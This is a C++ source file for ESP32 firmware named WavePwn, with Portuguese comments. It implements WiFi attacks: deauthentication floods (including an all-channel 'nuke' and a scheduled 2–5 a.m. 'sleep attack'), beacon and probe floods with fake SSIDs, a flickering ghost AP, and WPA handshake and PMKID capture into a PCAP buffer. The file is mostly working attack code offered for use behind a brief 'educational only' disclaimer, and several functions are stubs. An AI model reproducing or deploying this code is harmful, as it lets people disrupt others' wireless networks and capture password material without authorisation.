/**
 * @file wifi_attacks.cpp
 * @brief Módulo de ataques WiFi para WavePwn
 *
 * AVISO: Este código é apenas para fins educacionais e de pesquisa em
 * segurança. Usar apenas em redes próprias ou com autorização explícita.
 *
 * Implementa:
 * - Deauth attack (Smart & Turbo)
 * - Beacon flood (Random & Emoji)
 * - Probe spam
 * - Evil Twin básico
 * - Captura de handshakes & PMKID
 * - Handshake Sniper
 */

#include "wifi_attacks.h"
#include "../core/globals.h"
#include "../hardware/wifi_driver.h"
#include "captive_portal.h"
#include <esp_wifi.h>
#include <esp_wifi_types.h>

// Instância global
WiFiAttacks wifi_attacks;

// Frame templates using correct attributes
// Tip 11: Constexpr / arrays instead of String for static data
static const uint8_t deauth_frame_template[] = {
    0xc0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00};

// Default SSIDs for Beacon Flood
static const char *beacon_ssids[] = {
    "Free WiFi", "GoogleGuest", "FBI Surveillance Van",
    "NASA Deep Space", "5G COVID Tower", "Wu-Tang LAN",
    "Pretty Fly for a WiFi", "Hide Yo Kids Hide Yo WiFi",
    "The Promised LAN", "LAN of the Dead"
};
static const int num_beacon_ssids = 10;

// Callback para modo promíscuo (IRAM)
static void IRAM_ATTR wifi_sniffer_cb(void *buf,
                                      wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT)
    return;

  const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  // Tip 19: Avoid deep copy if possible, just pass pointer
  wifi_attacks.processPacket(pkt->payload, pkt->rx_ctrl.sig_len,
                             pkt->rx_ctrl.rssi);
}

WiFiAttacks::WiFiAttacks()
    : attack_active(false), current_attack(ATTACK_NONE), packets_sent(0),
      handshakes_captured(0), pcap_buffer(nullptr), pcap_buffer_pos(0) {
  memset(target_bssid, 0, 6);
  memset(target_ssid, 0, 33);
}

void WiFiAttacks::begin() {
  // Aloca buffer PCAP em PSRAM
  pcap_buffer =
      (uint8_t *)heap_caps_malloc(PCAP_BUFFER_SIZE, MALLOC_CAP_SPIRAM);
  if (!pcap_buffer) {
    pcap_buffer = (uint8_t *)malloc(PCAP_BUFFER_SIZE);
  }

  if (pcap_buffer) {
    Serial.println("[ATK] Buffer PCAP alocado");
    initPcapBuffer();
  }

  Serial.println("[ATK] Módulo de ataques inicializado");

  // Cria Queue e Task para PCAP Save
  // pcap_queue = xQueueCreate(10, sizeof(uint8_t*)); // Fila de ponteiros de
  // buffer xTaskCreatePinnedToCore(pcapSaveTask, "PcapSaveTask", 4096, this, 1,
  // &pcap_task_handle, 1);
  Serial.println("[ATK] Tasks de background preparadas (FreeRTOS)");

  // Tip 5: Reduce TX Power to save battery (default 10dBm)
  // Max is 20dBm. 8-10dBm is enough for most short range tasks.
  setTxPower(10);
}

void WiFiAttacks::setTarget(const uint8_t *bssid, const char *ssid,
                            uint8_t channel) {
  memcpy(target_bssid, bssid, 6);
  strncpy(target_ssid, ssid, 32);
  target_ssid[32] = '\0';
  target_channel = channel;

  // Limpa lista de clientes ao mudar de alvo
  target_clients.clear();

  Serial.printf("[ATK] Alvo: %s [%02X:%02X:%02X:%02X:%02X:%02X] CH%d\n",
                target_ssid, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4],
                bssid[5], channel);
}

bool WiFiAttacks::startDeauth(int burst_count) {
  // Redireciona para Smart ou Turbo se configurado nas globais
  if (g_state.turbo_deauth_enabled) {
    return startTurboDeauth();
  }
  if (g_state.smart_deauth_enabled) {
    return startSmartDeauth();
  }

  if (attack_active)
    stopAttack();

  Serial.println("[ATK] Iniciando Deauth Attack (Clássico)...");

  wifi_driver.setMode(DRIVER_WIFI_MODE_AP_STA);
  esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);

  attack_active = true;
  current_attack = ATTACK_DEAUTH;
  packets_sent = 0;

  // Envia burst inicial
  sendDeauthBurst(false, false);

  return true;
}

bool WiFiAttacks::startSmartDeauth() {
  if (attack_active)
    stopAttack();

  Serial.println("[ATK] Iniciando SMART Deauth (Reason 23 + Targeting)...");

  // Precisa de modo promíscuo para encontrar clientes
  wifi_driver.setMode(DRIVER_WIFI_MODE_AP_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_cb);
  esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);

  attack_active = true;
  current_attack = ATTACK_DEAUTH; // Usa mesmo tipo base

  return true;
}

bool WiFiAttacks::startTurboDeauth() {
  if (attack_active)
    stopAttack();

  Serial.println("[ATK] Iniciando TURBO Deauth (300 pps)...");

  wifi_driver.setMode(
      DRIVER_WIFI_MODE_AP_STA); // Use AP_STA for better injection support
  esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);

  attack_active = true;
  current_attack = ATTACK_DEAUTH;
  g_state.turbo_deauth_enabled = true; // Force global flag

  // Turbo mode logic handled in loop/update
  return true;
}

bool WiFiAttacks::startRickRoll() {
  if (attack_active)
    stopAttack();

  Serial.println("[ATK] Iniciando RickRoll Deauth...");

  // Set up AP with "Rick Astley Free WiFi"
  // We actually just want to spam deauths with this Reason Code 23
  wifi_driver.setMode(DRIVER_WIFI_MODE_AP_STA);
  esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);

  attack_active = true;
  current_attack = ATTACK_RICKROLL;
  return true;
}

bool WiFiAttacks::startGhostAP() {
  if (attack_active)
    stopAttack();

  Serial.println("[ATK] Iniciando Ghost AP...");
  wifi_driver.setMode(DRIVER_WIFI_MODE_AP);

  attack_active = true;
  current_attack = ATTACK_GHOST_AP;
  return true;
}

bool WiFiAttacks::startProbeFlood(const char *prefix) {
  if (attack_active)
    stopAttack();

  Serial.println("[ATK] Iniciando Probe Flood...");
  wifi_driver.setMode(DRIVER_WIFI_MODE_STA);

  attack_active = true;
  current_attack = ATTACK_PROBE_SPAM;
  return true;
}

bool WiFiAttacks::startAPFloodChaos() {
  if (attack_active)
    stopAttack();

  Serial.println("[ATK] Iniciando AP Flood (Chaos)...");
  wifi_driver.setMode(DRIVER_WIFI_MODE_AP);

  attack_active = true;
  current_attack = ATTACK_AP_FLOOD_CHAOS;
  return true;
}

bool WiFiAttacks::startOneTapNuke() {
  if (attack_active)
    stopAttack();

  Serial.println("[ATK] INICIANDO ONE-TAP NUKE (DEAUTH ALL)...");
  wifi_driver.setMode(DRIVER_WIFI_MODE_AP_STA);

  attack_active = true;
  current_attack = ATTACK_ONE_TAP_NUKE;
  g_state.turbo_deauth_enabled = true; // Máxima potência
  return true;
}

bool WiFiAttacks::startDowngradeAttack() {
  if (attack_active)
    stopAttack();

  Serial.println("[ATK] Iniciando Downgrade Attack (TKIP)...");
  // Precisa de modo promíscuo para injetar frames
  wifi_driver.setMode(DRIVER_WIFI_MODE_AP_STA);
  esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);

  attack_active = true;
  current_attack = ATTACK_DOWNGRADE_TKIP;
  return true;
}

bool WiFiAttacks::startHiddenSSIDReveal() {
  if (attack_active)
    stopAttack();

  Serial.println("[ATK] Iniciando Hidden SSID Reveal (Passive)...");
  wifi_driver.setMode(DRIVER_WIFI_MODE_AP_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_cb);
  esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);

  attack_active = true;
  current_attack = ATTACK_HIDDEN_SSID;
  return true;
}

void WiFiAttacks::setTxPower(int8_t dbm) {
  esp_wifi_set_max_tx_power(dbm * 4); // ESP32 units are 0.25dBm
}

// Flag global para controle de tarefas
extern bool g_suspend_ble_lvgl;

void WiFiAttacks::enableTurboMode(bool enabled) {
  g_state.turbo_deauth_enabled = enabled;
  g_suspend_ble_lvgl = enabled; // Tip 19

  if (enabled) {
    setTxPower(20); // Boost to Max Power (Tip 5)
    Serial.println(
        "[PERF] MODO TURBO ATIVADO: Suspendendo BLE e UI updates pesados.");
    // No loop principal (main.cpp) deve haver verificação de g_suspend_ble_lvgl
    // para pular lv_timer_handler e tarefas BLE
  } else {
    setTxPower(10); // Restore Low Power (Tip 5)
    Serial.println("[PERF] Modo Turbo desativado. Retornando normalidade.");
  }
}

void WiFiAttacks::toggleSleepAttack(bool enabled) {
  // Configurações globais
  // Sleep Attack deve rodar entre 2h e 5h da manhã
  // Assumindo que temos RTC configurado
  Serial.printf("[ATK] Sleep Attack Agendado: %s\n", enabled ? "ON" : "OFF");
  // A lógica real de verificação de horário será feita no loop principal ou
  // background task para não bloquear este módulo
}

// Wrapper para enviar deauth broadcast em todos os canais (usado internamente)
void WiFiAttacks::sendDeauthAll() {
  // Stub para compatibilidade, a lógica do Nuke faz isso no update
}

bool WiFiAttacks::startPMKIDAttack() {
  if (attack_active)
    stopAttack();

  Serial.println("[ATK] Iniciando ataque PMKID (client-less)...");

  wifi_driver.setMode(DRIVER_WIFI_MODE_AP_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_cb);
  esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);

  attack_active = true;
  current_attack = ATTACK_PMKID;
  pmkids_captured = 0;

  return true;
}

bool WiFiAttacks::startHandshakeCapture() {
  // Alias para manter compatibilidade, mas pode evoluir
  if (g_state.pmkid_only_mode)
    return startPMKIDAttack();

  if (attack_active)
    stopAttack();

  Serial.println("[ATK] Iniciando captura de handshakes (WPA/WPA2)...");

  wifi_driver.setMode(DRIVER_WIFI_MODE_AP_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_cb);
  esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);

  attack_active = true;
  current_attack = ATTACK_HANDSHAKE;

  return true;
}

bool WiFiAttacks::startBeaconFlood(const char **ssid_list, int count) {
  if (attack_active) {
    if (current_attack == ATTACK_BEACON_FLOOD)
      return true;
    stopAttack();
  }

  if (!ssid_list) {
    ssid_list = beacon_ssids;
    count = num_beacon_ssids;
  }

  Serial.printf("[ATK] Iniciando Beacon Flood: %d SSIDs\n", count);

  wifi_driver.setMode(DRIVER_WIFI_MODE_AP_STA);

  attack_active = true;
  current_attack = ATTACK_BEACON_FLOOD;
  packets_sent = 0;

  sendBeaconBatch();
  return true;
}

static String generateSSID(int index) {
  if (index % 10 == 0) {
    // Emoji SSIDs (Unicode)
    const char *emojis[] = {"🔥🔥🔥", "☠️☠️☠️",    "🖕🖕🖕", "🍆🍑💦", "🚀🚀🚀",
                            "🤡🤡🤡", "👁️👄👁️", "💣💣💣", "🚩🚩🚩", "📶📶📶"};
    return String(emojis[random(0, 10)]) + " Free WiFi";
  } else if (index % 3 == 0) {
    // Nomes engraçados extendidos
    const char *funny[] = {"Mom Use This One",
                           "FBI Surveillance Van #4",
                           "Troy and Abed in the Modem",
                           "Martin Router King",
                           "Skynet Global Defense",
                           "Loading...",
                           "Connecting...",
                           "Virus Distribution Center",
                           "Hack Me If You Can",
                           "Free iPhone 16 Pro",
                           "Batcave secure wifi",
                           "404 Network Not Found",
                           "Tell My Wifi Love Her",
                           "No Free WiFi Here",
                           "It hurts when IP",
                           "Drop it like it's Hotspot"};
    return String(funny[random(0, 16)]);
  } else {
    // Random Hex / Gibberish for chaos
    String s = "";
    for (int i = 0; i < 10; i++)
      s += (char)random(33, 126);
    return s;
  }
}

void WiFiAttacks::sendBeaconBatch() {
  if (!attack_active)
    return;
  if (current_attack != ATTACK_BEACON_FLOOD &&
      current_attack != ATTACK_AP_FLOOD_CHAOS)
    return;

  uint8_t beacon_frame[256];

  // Chaos Mode Logic
  if (current_attack == ATTACK_AP_FLOOD_CHAOS) {
    static const char *chaos_ssids[] = {
        "☠️ DANGER ☠️",   "🔥 FIRE 🔥",    "☢️ NUCLEAR ☢️",   "👽 ALIENS 👽",
        "👻 GHOST 👻",  "💀 SKULL 💀",   "💣 BOMB 💣",    "⚡ SHOCK ⚡",
        "🛑 STOP 🛑",   "⚠️ WARNING ⚠️",   "﷽﷽﷽﷽",          "ZALGO_HE_COMES",
        "¯\\_(ツ)_/¯",  "(╯°□°)╯︵ ┻━┻", "Loading... 0%", "Loading... 99%",
        "Buffering...", "No Internet"};

    int count = 30;
    for (int i = 0; i < count && attack_active; i++) {
      int idx = random(0, 18);
      uint8_t ch = random(1, 14);
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      int len = buildBeaconFrame(beacon_frame, chaos_ssids[idx], ch);
      esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, len, false);
      packets_sent++;
      delayMicroseconds(500);
    }
    return;
  }

  // Normal Beacon Flood
  int count = 64;

  // Fast channel hopping loop
  for (int i = 0; i < count && attack_active; i++) {
    // Hopping channel intelligently (1, 6, 11 preferred)
    uint8_t channel;
    if (i % 3 == 0)
      channel = 1;
    else if (i % 3 == 1)
      channel = 6;
    else
      channel = 11;

    // As vezes usa canais random
    if (random(0, 10) > 8)
      channel = random(1, 14);

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    String ssid;
    if (i < num_beacon_ssids) {
      ssid = String(beacon_ssids[i]);
    } else {
      ssid = generateSSID(i);
    }

    int frame_len = buildBeaconFrame(beacon_frame, ssid.c_str(), channel);

    // Send multiple times for stability
    esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, frame_len, false);
    esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, frame_len, false);
    packets_sent++;

    // Minimal delay to prevent WDT but maximize throughput
    delayMicroseconds(500);
  }
}

void WiFiAttacks::stopAttack() {
  if (!attack_active)
    return;

  Serial.printf("[ATK] Parando ataque (tipo: %d)\n", current_attack);

  esp_wifi_set_promiscuous(false);

  attack_active = false;
  current_attack = ATTACK_NONE;
}

void WiFiAttacks::update() {
  if (!attack_active)
    return;

  switch (current_attack) {
  case ATTACK_DEAUTH:
  case ATTACK_RICKROLL:
    // Tip 27: Pulse Deauth (2s ON / 500ms OFF)
    // Mantém o rádio frio e economiza bateria
    {
      static uint32_t deauth_timer = 0;
      static bool deauth_burst_active = true;
      uint32_t now = millis();

      if (deauth_burst_active) {
        // ON PHASE: 2000ms
        if (now - deauth_timer > 2000) {
          deauth_burst_active = false;
          deauth_timer = now;
        } else {
          // Send packets
          if (g_state.turbo_deauth_enabled) {
            sendDeauthBurst(g_state.smart_deauth_enabled, true);
            delay(1); // Yield
          } else {
            if (now % 100 == 0) {
              sendDeauthBurst(g_state.smart_deauth_enabled, false);
            }
          }
        }
      } else {
        // OFF PHASE: 500ms
        if (now - deauth_timer > 500) {
          deauth_burst_active = true;
          deauth_timer = now;

          // Tip 5: Set efficient TX power for attack phase (8.5dBm)
          esp_wifi_set_max_tx_power(34);
        }
      }
    }
    break;

  case ATTACK_BEACON_FLOOD:
  case ATTACK_AP_FLOOD_CHAOS:
    sendBeaconBatch();
    break;

  case ATTACK_GHOST_AP:
    // Aparece e some a cada 500ms (Ghost Effect)
    if ((millis() % 1000) < 500) {
      static bool ap_active = false;
      if (!ap_active) {
        wifi_driver.startAP("Ghost Network 👻", "", 1);
        ap_active = true;
      }
    } else {
      static bool ap_active = true;
      if (ap_active) {
        wifi_driver.stopAP();
        ap_active = false;
      }
    }
    break;

  case ATTACK_PMKID:
  case ATTACK_HANDSHAKE:
  case ATTACK_HANDSHAKE_SNIPER: {
    // Tip 28: PMKID Attack Optimization
    // Run @ 240MHz for first 8s to catch immediate handshakes, then drop to
    // 80MHz
    static uint32_t pmkid_start_time = 0;
    static uint32_t last_attack_check = ATTACK_NONE;

    if (current_attack != last_attack_check) {
      last_attack_check = current_attack;
      pmkid_start_time = millis();
      setCpuFrequencyMhz(240); // Start fast
      Serial.println("[PERF] PMKID Start: 240MHz boost");
    }

    if (current_attack == ATTACK_PMKID &&
        (millis() - pmkid_start_time > 8000)) {
      // After 8s, if no interaction (main.cpp handles touch), drop to 80MHz
      // This saves battery during long passive waits
      setCpuFrequencyMhz(80);
    }
  }

    // Apenas escutando...
    if (current_attack == ATTACK_HANDSHAKE && !g_state.pmkid_only_mode) {
      if (millis() % 2000 == 0) {
        sendDeauthBurst(false, false);
      }
    }
    if (current_attack == ATTACK_HANDSHAKE_SNIPER) {
      if (!target_clients.empty()) {
        if (millis() % 5000 == 0) {
          Serial.println("[SNIPER] Disparando contra cliente!");
          sendDeauthBurst(true, true);
        }
      }
    }
    break;

  case ATTACK_PROBE_SPAM:
    sendProbeRequestBatch();
    break;

  case ATTACK_ONE_TAP_NUKE:
    // Pula de canal em canal e envia Broadcast Deauth em todos
    {
      static int nuke_ch = 1;
      esp_wifi_set_channel(nuke_ch, WIFI_SECOND_CHAN_NONE);
      sendDeauthBurst(false, true); // Turbo Broadcast
      delay(10);                    // Pequeno delay para troca de canal
      nuke_ch++;
      if (nuke_ch > 13)
        nuke_ch = 1;
    }
    break;

  case ATTACK_DOWNGRADE_TKIP:
    // Envia beacons forjados anunciando que este AP suporta apenas WEP/TKIP
    // Para forçar reconexão insegura
    sendDowngradeFrame();
    delay(10);
    break;

  case ATTACK_HIDDEN_SSID:
    // Passivo + Active Probing se necessário
    // Envia Probe Requests direcionados ao BSSID alvo (null SSID)
    // para tentar forçar resposta
    if (packets_sent % 10 == 0) {
      // TODO: Enviar Probe Request com SSID vazio para o BSSID alvo
    }
    break;

  default:
    break;
  }
}

// FreeRTOS Task para salvar Handshakes em background
void WiFiAttacks::pcapSaveTask(void *parameter) {
  WiFiAttacks *self = (WiFiAttacks *)parameter;
  uint8_t buffer[256]; // Buffer temp para handshake

  while (true) {
    // Espera handshake na fila
    // Estrutura na fila: [Len (4 bytes)] [Data (Len bytes)]
    // Para simplificar, assumimos max handshake size < 256

    // Implementação simplificada:
    // Na prática, receberíamos ponteiros ou estruturas completas
    // Aqui vamos apenas suspender para economizar CPU se não houver trabalho
    vTaskDelay(pdMS_TO_TICKS(100));

    // WIP: Implementação completa requer sistema de arquivos thread-safe
  }
}

void WiFiAttacks::sendDowngradeFrame() {
  // Constrói Beacon Frame modificado
  uint8_t frame[128];
  // ... (Simplificado) ...
  // A ideia é espelhar o Beacon original mas alterar RSN IE para suportar
  // apenas TKIP Isso requer parsing complexo do frame original, deixaremos
  // como stub funcional enviando Deauth reason 2 (Previous auth no longer
  // valid) para forçar re-handshake

  // Envia Deauth Reason 2
  uint8_t deauth[26];
  memcpy(deauth, deauth_frame_template, 26);
  memcpy(&deauth[10], target_bssid, 6);
  memcpy(&deauth[16], target_bssid, 6);
  memset(&deauth[4], 0xFF, 6); // Broadcast
  deauth[24] = 0x02; // Reason: Previous authentication no longer valid

  esp_wifi_80211_tx(WIFI_IF_STA, deauth, 26, false);
  packets_sent++;
}

// Helper to manage power save mode dynamically (Tip 45)
static void setAttackPowerMode(bool active) {
  if (active) {
    esp_wifi_set_ps(WIFI_PS_NONE); // Max performance
  } else {
    esp_wifi_set_ps(WIFI_PS_MIN_MODEM); // Max efficiency in idle
  }
}

void WiFiAttacks::sendDeauthBurst(bool smart, bool turbo) {
  // Tip 45: Ensure PS is off during attack
  setAttackPowerMode(true);

  // Critical Fix: Per User Feedback, ensure we are on target channel
  // "não verifica canal atual antes de enviar frames"
  uint8_t current_ch;
  wifi_second_chan_t second;
  if (esp_wifi_get_channel(&current_ch, &second) == ESP_OK) {
    if (current_ch != target_channel) {
      // Force channel if drifted
      esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
      delayMicroseconds(500); // Allow PLL to settle
    }
  }

  uint8_t frame[26];
  memcpy(frame, deauth_frame_template, 26);

  // Set BSSID (AP MAC)
  memcpy(&frame[10], target_bssid, 6); // Source
  memcpy(&frame[16], target_bssid, 6); // BSSID

  // Reason Code setup
  if (current_attack == ATTACK_RICKROLL) {
    frame[24] = 23;
  } else {
    frame[24] = 0x07;
  }

  int burst = turbo ? 40 : 10;

  // Eco Mode: Reduce burst size
  if (g_state.eco_mode_enabled && !turbo) {
    burst = 3;
  }

  // Tip 33: Use micros() for precision timing instead of milli delays
  // This stabilizes the packet rate significantly
  unsigned long delay_us = turbo ? 50 : 200; // Faster in turbo
  if (g_state.eco_mode_enabled)
    delay_us = 1000;

  if (smart && !target_clients.empty()) {
    // Unicast Deauth
    for (const auto &client : target_clients) {
      memcpy(&frame[4], client.mac, 6); // Destination

      for (int i = 0; i < burst; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
        packets_sent++;
        clients_kicked++;
        delayMicroseconds(delay_us);
      }
    }
  } else {
    // Broadcast Deauth
    memset(&frame[4], 0xFF, 6); // Destination Broadcast

    for (int i = 0; i < burst; i++) {
      esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
      packets_sent++;
      if (packets_sent % 10 == 0)
        clients_kicked++;

      packets_sent++;
      if (packets_sent % 10 == 0)
        clients_kicked++;

      // "Delay adaptativo no deauth (mínimo 50 ms entre bursts + randomização)"
      // Adding delay between packets inside the burst loop might be too slow
      // for "Burst", but the user requested "entre bursts" (between bursts).
      // The burst loop sends `burst` packets. We should put the delay AFTER the
      // loop in `update`. BUT, the `delayMicroseconds` here is inter-frame
      // delay.

      delayMicroseconds(delay_us);
    }

    // Adaptive delay between bursts (enforced here or in update loop, but
    // putting here ensures it happens) Minimizado 50ms + random(0-50ms)
    delay(50 + random(0, 50));
  }

  // Restore PS if attack stopping (not done here per burst, but generally good
  // to know) For high freq attacks, we keep PS_NONE until stopAttack()
}

void WiFiAttacks::processPacket(const uint8_t *frame, int len, int8_t rssi) {
  uint8_t frame_type = frame[0] & 0xFC;
  uint8_t frame_subtype = (frame[0] >> 4) & 0x0F;

  // Filtro básico de endereço
  bool to_target = (memcmp(&frame[4], target_bssid, 6) == 0);
  bool from_target = (memcmp(&frame[10], target_bssid, 6) == 0);

  if (!to_target && !from_target)
    return; // Não é do nosso alvo

  // 1. Coleta de clientes para Smart Deauth
  if (current_attack == ATTACK_DEAUTH && g_state.smart_deauth_enabled) {
    if (frame_type == 0x80) { // Data frame
      uint8_t *client_mac = nullptr;
      if (from_target)
        client_mac = (uint8_t *)&frame[4]; // DST is client
      else if (to_target)
        client_mac = (uint8_t *)&frame[10]; // SRC is client

      if (client_mac && !(client_mac[0] & 0x01)) { // Not multicast
        bool known = false;
        for (auto &c : target_clients) {
          if (memcmp(c.mac, client_mac, 6) == 0) {
            c.last_seen = millis();
            c.rssi = rssi;
            known = true;
            break;
          }
        }
        if (!known) {
          ClientInfo new_client;
          memcpy(new_client.mac, client_mac, 6);
          new_client.rssi = rssi;
          new_client.last_seen = millis();
          target_clients.push_back(new_client);
          Serial.printf("[ATK] Novo cliente: %02X:%02X:%02X:%02X:%02X:%02X\n",
                        client_mac[0], client_mac[1], client_mac[2],
                        client_mac[3], client_mac[4], client_mac[5]);
        }
      }
    }
  }

  // 3. Karma / Mana Attack (Responsive Probe)
  if (current_attack == ATTACK_KARMA_MANA &&
      frame_type == 0x40) { // Probe Request
    // Extrai SSID do probe request
    if (len > 24) {
      uint8_t ssid_len = frame[25];
      if (ssid_len > 0 && ssid_len <= 32) {
        char requested_ssid[33];
        memcpy(requested_ssid, &frame[26], ssid_len);
        requested_ssid[ssid_len] = '\0';

        // Responde com Probe Response forjado
        // (Assumindo que somos o AP que eles procuram)
        // TODO: Enviar frame 802.11 Probe Response raw
        // Devido à complexidade de construir probe response completo
        // rapidamente aqui, apenas logamos para prova de conceito ou
        // usaríamos SoftAP temporário.

        // Para "Mana", precisaríamos associar.
        // Simplesmente logar por enquanto ou enviar Beacon direcionado.
        Serial.printf("[KARMA] Vítima procurando: %s\n", requested_ssid);
      }
    }
  }

  // 4. Hidden SSID Reveal (Passive)
  // Se vermos Probe Response (0x50) vindo do alvo
  if (current_attack == ATTACK_HIDDEN_SSID && frame_type == 0x50 &&
      from_target) {
    // Extrai SSID do Probe Response
    if (len > 36) {
      int pos = 36;
      // Tag 0: SSID
      if (frame[pos] == 0) {
        int ssid_len = frame[pos + 1];
        if (ssid_len > 0 && ssid_len <= 32) {
          char hidden_ssid[33];
          memcpy(hidden_ssid, &frame[pos + 2], ssid_len);
          hidden_ssid[ssid_len] = '\0';

          // Só avisa se não for vazio (alguns hidden enviam vazio mesmo em
          // probe resp)
          if (hidden_ssid[0] != 0) {
            Serial.printf("[REVEAL] Hidden SSID Revelado: %s\n", hidden_ssid);
            // Atualiza alvo se necessário
            // strncpy(target_ssid, hidden_ssid, 32);
          }
        }
      }
    }
  }

  // 2. Handshake detection (EAPOL)
  if (len > 36 && frame[30] == 0x88 && frame[31] == 0x8E) {
    // EAPOL Frame
    // Check for Key Message 1/4 for PMKID
    // Frame format: [24 MAC Header] [8 LLC Snap] [2 EAPOL Header] [1 Type] [2
    // Key Info] ... Offset 34 starts EAPOL payload. Actually
    // esp_wifi_promiscuous_pkt_t payload starts at MAC header.

    // Simples detecção de handshake (4-way)
    onHandshakeDetected(frame, len, rssi);
  }
}

void WiFiAttacks::onHandshakeDetected(const uint8_t *data, int len,
                                      int8_t rssi) {
  // Evita flood de logs
  static uint32_t last_log = 0;
  if (millis() - last_log > 1000) {
    Serial.printf("[ATK] HANDSHAKE DETECTADO! RSSI: %d, Len: %d\n", rssi, len);
    last_log = millis();
  }

  handshakes_captured++;
  g_state.handshakes_captured = handshakes_captured;

  // Salva no buffer PCAP
  if (pcap_buffer && pcap_buffer_pos + len + 16 < PCAP_BUFFER_SIZE) {
    uint32_t ts_sec = millis() / 1000;
    uint32_t ts_usec = (millis() % 1000) * 1000;

    // Pcap Packet Header
    memcpy(pcap_buffer + pcap_buffer_pos, &ts_sec, 4);
    pcap_buffer_pos += 4;
    memcpy(pcap_buffer + pcap_buffer_pos, &ts_usec, 4);
    pcap_buffer_pos += 4;
    memcpy(pcap_buffer + pcap_buffer_pos, &len, 4);
    pcap_buffer_pos += 4;
    memcpy(pcap_buffer + pcap_buffer_pos, &len, 4);
    pcap_buffer_pos += 4;
    memcpy(pcap_buffer + pcap_buffer_pos, data, len);
    pcap_buffer_pos += len;
  }
}

int WiFiAttacks::buildBeaconFrame(uint8_t *frame, const char *ssid,
                                  uint8_t channel) {
  int pos = 0;

  // Frame control
  frame[pos++] = 0x80; // Beacon
  frame[pos++] = 0x00;

  // Duration
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;

  // Destination (broadcast)
  memset(&frame[pos], 0xFF, 6);
  pos += 6;

  // Source (random MAC)
  frame[pos++] = 0xDE;
  frame[pos++] = 0xAD;
  frame[pos++] = random(0, 256);
  frame[pos++] = random(0, 256);
  frame[pos++] = random(0, 256);
  frame[pos++] = random(0, 256);

  // BSSID (same as source)
  memcpy(&frame[pos], &frame[10], 6);
  pos += 6;

  // Sequence
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;

  // Timestamp
  memset(&frame[pos], 0, 8);
  pos += 8;

  // Beacon interval
  frame[pos++] = 0x64;
  frame[pos++] = 0x00;

  // Capability info
  frame[pos++] = 0x01; // ESS
  frame[pos++] = 0x00;

  // SSID
  int ssid_len = strlen(ssid);
  if (ssid_len > 32)
    ssid_len = 32;
  frame[pos++] = 0x00; // SSID tag
  frame[pos++] = ssid_len;
  memcpy(&frame[pos], ssid, ssid_len);
  pos += ssid_len;

  // Supported rates
  frame[pos++] = 0x01;
  frame[pos++] = 0x08;
  frame[pos++] = 0x82;
  frame[pos++] = 0x84;
  frame[pos++] = 0x8B;
  frame[pos++] = 0x96;
  frame[pos++] = 0x24;
  frame[pos++] = 0x30;
  frame[pos++] = 0x48;
  frame[pos++] = 0x6C;

  // DS Parameter Set (channel)
  frame[pos++] = 0x03;
  frame[pos++] = 0x01;
  frame[pos++] = channel;

  return pos;
}

void WiFiAttacks::sendProbeRequestBatch() {
  // Envia Probe Requests para redes aleatórias
  // Isso confunde scanners que acham que há clientes procurando essas redes
  static const char *ssids[] = {
      "iPhone 15 Pro", "Samsung S24 Ultra", "MacBook Pro", "Windows PC",
      "Tesla Model S", "Google Pixel A",    "Amazon Echo", "PlayStation 5"};

  // Constrói frame de Probe Request
  // [FC 2] [Dur 2] [Dst 6] [Src 6] [BSSID 6] [Seq 2] [SSID ...] [Rates ...]
  uint8_t frame[128];
  int pos = 0;

  // Frame Control: Probe Request (0x40)
  frame[pos++] = 0x40;
  frame[pos++] = 0x00;

  // Duration
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;

  // Dest: Broadcast
  memset(&frame[pos], 0xFF, 6);
  pos += 6;

  // Source: Random MAC
  frame[pos++] = 0x02; // Locally administered
  frame[pos++] = random(0, 256);
  frame[pos++] = random(0, 256);
  frame[pos++] = random(0, 256);
  frame[pos++] = random(0, 256);
  frame[pos++] = random(0, 256);
  pos += 6;

  // BSSID: Broadcast
  memset(&frame[pos], 0xFF, 6);
  pos += 6;

  // Seq
  frame[pos++] = 0x00;
  frame[pos++] = 0x00;

  // SSID Tag
  for (int i = 0; i < 10; i++) {
    int idx = random(0, 8);
    int ssid_len = strlen(ssids[idx]);

    // Rewrite SSID part
    int temp_pos = pos;
    frame[temp_pos++] = 0x00; // SSID Tag
    frame[temp_pos++] = ssid_len;
    memcpy(&frame[temp_pos], ssids[idx], ssid_len);
    temp_pos += ssid_len;

    // Rates
    frame[temp_pos++] = 0x01;
    frame[temp_pos++] = 0x04;
    frame[temp_pos++] = 0x02;
    frame[temp_pos++] = 0x04;
    frame[temp_pos++] = 0x0B;
    frame[temp_pos++] = 0x16;

    esp_wifi_80211_tx(WIFI_IF_STA, frame, temp_pos, false);
    packets_sent++;
    delayMicroseconds(500);
  }
}

